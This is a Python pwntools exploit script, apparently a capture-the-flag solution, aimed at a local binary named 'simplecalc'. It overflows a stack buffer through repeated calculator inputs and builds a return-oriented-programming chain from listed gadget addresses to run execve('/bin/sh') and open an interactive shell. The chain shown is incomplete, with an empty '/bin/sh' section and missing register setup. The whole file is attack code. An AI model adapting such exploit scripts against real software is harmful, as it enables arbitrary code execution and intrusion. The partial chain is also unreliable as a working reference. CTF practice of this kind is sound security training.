from pwn import *

'''
0x0000000000400488 syscall
0x000000000044db34 pop rax; ret
0x0000000000401b73 pop rdi; ret
0x0000000000401c87 pop rsi; ret
0x0000000000437a85 pop rdx; ret

rax: 0x3b, rdi: point to bin/sh/, rsi: 0, rdx: 0
saved_arr at rbp-0x40 ; 0x48 between saved arr and rip
'''

target = process('./simplecalc')

target.recvuntil(b":")
target.sendline(b"24")

for i in range(18):
    target.recvuntil(b"> ")
    target.sendline(b"1")
    target.recvuntil(b": ")
    target.sendline(b"250")
    target.recvuntil(b": ")
    target.sendline(b"250")

# 0x0000000000401b73 pop rdi; ret
target.recvuntil(b">")
target.sendline(b"1")
target.recvuntil(b": ")
target.sendline(b"2100666")
target.recvuntil(b": ")
target.sendline(b"2100665")

target.recvuntil(b">")
target.sendline(b"2")
target.recvuntil(b": ")
target.sendline(b"500")
target.recvuntil(b": ")
target.sendline(b"500")

# /bin/sh



# # 0x0000000000400488 syscall
target.recvuntil(b">")
target.sendline(b"1")
target.recvuntil(b": ")
target.sendline(b"2097732")
target.recvuntil(b": ")
target.sendline(b"2097732")

target.recvuntil(b">")
target.sendline(b"2")
target.recvuntil(b": ")
target.sendline(b"500")
target.recvuntil(b": ")
target.sendline(b"500")

target.interactive()
